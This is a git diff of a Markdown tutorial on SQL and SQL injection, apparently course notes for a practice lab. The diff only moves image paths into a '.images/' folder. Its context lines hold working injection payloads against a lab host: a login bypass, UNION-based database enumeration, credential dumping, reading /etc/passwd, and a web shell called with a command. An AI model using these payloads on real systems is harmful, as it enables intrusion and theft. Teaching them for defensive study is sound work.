@@ -103,7 +103,7 @@ The `SHOW DATABASES` statement lists all databases.
 SHOW DATABASES;
 ```
 
-![Filtered output](images/show-databases.png)
+![Filtered output](.images/show-databases.png)
 
 The `USE` statement switches to a particular database.
 
@@ -140,7 +140,7 @@ CREATE TABLE logins (
 );
 ```
 
-![Filtered output](images/create-table.png)
+![Filtered output](.images/create-table.png)
 
 The `SHOW TABLES` statement lists all tables in the database.
 
@@ -150,7 +150,7 @@ The `SHOW TABLES` statement lists all tables in the database.
 SHOW TABLES;
 ```
 
-![Filtered output](images/show-tables.png)
+![Filtered output](.images/show-tables.png)
 
 The `DESCRIBE` statement is used to get more information about a table and its structure.
 
@@ -164,7 +164,7 @@ DESCRIBE <name>;
 DESCRIBE logins;
 ```
 
-![Filtered output](images/describe.png)
+![Filtered output](.images/describe.png)
 
 ---
 
@@ -212,7 +212,7 @@ SELECT * FROM <name>;
 SELECT * FROM logins;
 ```
 
-![Filtered output](images/select-all.png)
+![Filtered output](.images/select-all.png)
 
 Select specific columns from a table:
 
@@ -224,7 +224,7 @@ SELECT col1, col2, ... FROM <name>;
 SELECT username, password FROM logins;
 ```
 
-![Filtered output](images/select-columns.png)
+![Filtered output](.images/select-columns.png)
 
 The `DROP` statement is used to delete tables. Use with `caution` — deletion is permanent and occurs without confirmation.
 
@@ -298,7 +298,7 @@ SELECT <records> FROM <table> LIMIT <number>;
 SELECT * FROM logins LIMIT 2;
 ```
 
-![Filtered output](images/limit.png)
+![Filtered output](.images/limit.png)
 
 The `WHERE` clause filters query results based on some condition. The `WHERE` clause is similar to an `if` statement in traditional programming languages. 
 
@@ -315,7 +315,7 @@ SELECT * FROM logins WHERE username = 'admin';
 SELECT * FROM logins WHERE id > 1;
 ```
 
-![Filtered output](images/where-clause.png)
+![Filtered output](.images/where-clause.png)
 
 The `LIKE` clause filters a query based on some pattern. The `LIKE` operator performs simple pattern matching using wildcards, but is not a full `regular expression` engine.
 
@@ -393,7 +393,7 @@ SELECT * FROM logins WHERE username != 'john';
 SELECT * FROM logins WHERE username != 'john' AND id > 1;
 ```
 
-![Filtered output](images/logical-operators.png)
+![Filtered output](.images/logical-operators.png)
 
 Logical operators follow a defined **order of precedence**, which determines how expressions are evaluated when parentheses are not used.
 
@@ -514,7 +514,7 @@ Inject into the `Username` field, leave the the `Password` field blank:
 admin' OR '1' = '1
 ```
 
-![Filtered output](images/or-injection.png)
+![Filtered output](.images/or-injection.png)
 
 Back-end SQL query after injection:
 
@@ -639,7 +639,7 @@ SELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2, 3, 4 FRO
 
 The trailing comment ensures that the remainder of the original query is ignored.
 
-![Filtered output](images/union-injection.png)
+![Filtered output](.images/union-injection.png)
 
 **Example:**
 
@@ -653,13 +653,13 @@ Utilize the `DESCRIBE` statement to find the number of columns in each table.
 DESCRIBE employees;
 ```
 
-![Filtered output](images/describe2.png)
+![Filtered output](.images/describe2.png)
 
 ```sql
 DESCRIBE departments;
 ```
 
-![Filtered output](images/describe3.png)
+![Filtered output](.images/describe3.png)
 
 The `employees` table contains six columns and the `departments` table contains two columns. 
 
@@ -685,7 +685,7 @@ An attacker is targeting an application used to track shipping ports. The attack
 http://94.237.54.192:55159/search.php?port_code=cn
 ```
 
-![Filtered output](images/shipping-port.png)
+![Filtered output](.images/shipping-port.png)
 
 Based on the URL the attacker assumes that the back-end SQL query looks something like this:
 
@@ -699,7 +699,7 @@ The attacker initiates the SQL injection discovery process by injecting a single
 http://94.237.54.192:55159/search.php?port_code='
 ```
 
-![Filtered output](images/union-injection2.png)
+![Filtered output](.images/union-injection2.png)
 
 The single quote `'` injection caused a SQL syntax error. This means that the attacker was able to input something that changed the SQL query being sent to the back-end database. This strongly suggests that user input is being directly incorporated into the SQL query without proper handling. 
 
@@ -738,7 +738,7 @@ http://94.237.54.192:55159/search.php?port_code=%27+ORDER+BY+5--+
 
 An error is induced on the fifth column, meaning that the table has four columns.
 
-![Filtered output](images/order-by.png)
+![Filtered output](.images/order-by.png)
 
 **Method 2: `UNION`**
 
@@ -757,7 +757,7 @@ http://94.237.54.192:55159/search.php?port_code=%27+UNION+SELECT+1%2C2%2C3%2C4--
 
 A successful response indicates that the injected `UNION SELECT` matches the column count of the original query.
 
-![Filtered output](images/union-select.png)
+![Filtered output](.images/union-select.png)
 
 Even though the table has four columns, all columns are not necessarily shown in the output. The attacker must figure out which columns are shown in order to determine where to inject payloads. 
 
@@ -773,7 +773,7 @@ http://94.237.54.192:55159/search.php?port_code=cn%27+UNION+SELECT+1%2C2%2C3%2C4
 
 Only columns 2, 3 and 4 are displayed in the output. This means that the payload must be injected into one of these columns.
 
-![Filtered output](images/injection-point.png)
+![Filtered output](.images/injection-point.png)
 
 The example above demonstrates a scenario where it is beneficial to use `INT` as junk data, instead of `NULL`. Using `INT` makes it easy to track exactly which columns are being displayed. 
 
@@ -790,7 +790,7 @@ To be confirm the DBMS and version, the attacker injects a `@@version` payload i
 cn' UNION SELECT 1, @@version, 3, 4--   
 ```
 
-![Filtered output](images/version-payload.png)
+![Filtered output](.images/version-payload.png)
 
 The exact DBMS and version is `10.3.22-MariaDB-1ubuntu1`.
 
@@ -800,7 +800,7 @@ The attacker proceeds by fingerprinting the current user by injecting the `user(
 cn' UNION SELECT 1, user(), 3, 4--   
 ```
 
-![Filtered output](images/fingerprint-user.png)
+![Filtered output](.images/fingerprint-user.png)
 
 The current user is `root`. Running the database as `root` significantly increases the impact of a successful SQL injection.
 
@@ -824,7 +824,7 @@ The attacker utilizes this information to retrieve a list of all databases:
 cn' UNION SELECT 1, SCHEMA_NAME, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA--   
 ```
 
-![Filtered output](images/enumerate-dbs.png)
+![Filtered output](.images/enumerate-dbs.png)
 
 `TABLES` is also a table in `INFORMATION_SCHEMA`. The `TABLE_NAME` column in `TABLES` is a list of all tables on the DBMS.
 
@@ -834,7 +834,7 @@ The attacker performs a similar injection to before, in order to retrieve a list
 cn' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES--   
 ```
 
-![Filtered output](images/enumerate-tables.png)
+![Filtered output](.images/enumerate-tables.png)
 
 To craft a more precise query, the exact database to pull tables from can be specified. For example, the `dev` database:
 
@@ -842,7 +842,7 @@ To craft a more precise query, the exact database to pull tables from can be spe
 cn' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dev'--    
 ```
 
-![Filtered output](images/enumerate-tables2.png)
+![Filtered output](.images/enumerate-tables2.png)
 
 `COLUMNS` is another table in `INFORMATION_SCHEMA`. The `COLUMN_NAME` column in `COLUMNS` contains the names of all columns across all tables.
 
@@ -870,7 +870,7 @@ This payload places the extracted data into columns that were previously identif
 cn' UNION SELECT 1, username, password, 4 FROM dev.credentials--  
 ```
 
-![Filtered output](images/payload.png)
+![Filtered output](.images/payload.png)
 
 As a result, the attacker is able to extract sensitive credential data directly from the database.
 
@@ -900,7 +900,7 @@ cn' UNION SELECT 1, CURRENT_USER(), 3, 4--
 cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- 
 ```
 
-![Filtered output](images/user.png)
+![Filtered output](.images/user.png)
 
 The current user is `root`. This is usually a good sign.
 
@@ -921,7 +921,7 @@ SELECT super_priv FROM mysql.user;
  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'-- 
 ```
 
-![Filtered output](images/super-admin.png)
+![Filtered output](.images/super-admin.png)
 
 The query returns `Y`, indicating that the user has `administrative` privileges.
 
@@ -931,7 +931,7 @@ A similar payload can be utilized to enumerate **all** privileges assigned to th
 cn' UNION SELECT 1, grantee, privilege_type, 4 FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee=" 'root'@'localhost "--  
 ```
 
-![Filtered output](images/file-privileges.png)
+![Filtered output](.images/file-privileges.png)
 
 The result from the query confirms that the `root` user does indeed have `FILE` privileges. 
 
@@ -951,7 +951,7 @@ SELECT LOAD_FILE('/etc/passwd');
 cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4--  
 ```
 
-![Filtered output](images/file-read.png)
+![Filtered output](.images/file-read.png)
 
 ---
 
@@ -988,7 +988,7 @@ The above payload can be refined to specify the exact variable to pull from the 
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE variable_name='secure_file_priv'--   
 ```
 
-![Filtered output](images/secure-file-priv.png)
+![Filtered output](.images/secure-file-priv.png)
 
 The variable value is empty, indicating that we can read/write across the entire filesystem.
 
@@ -1028,4 +1028,4 @@ We can communicate with the web shell by visiting the web root URL and issue com
 http://94.237.61.242:31929/shell.php?0=ls+-la
 ```
 
-![Filtered output](images/file-write-shell.png)
+![Filtered output](.images/file-write-shell.png)
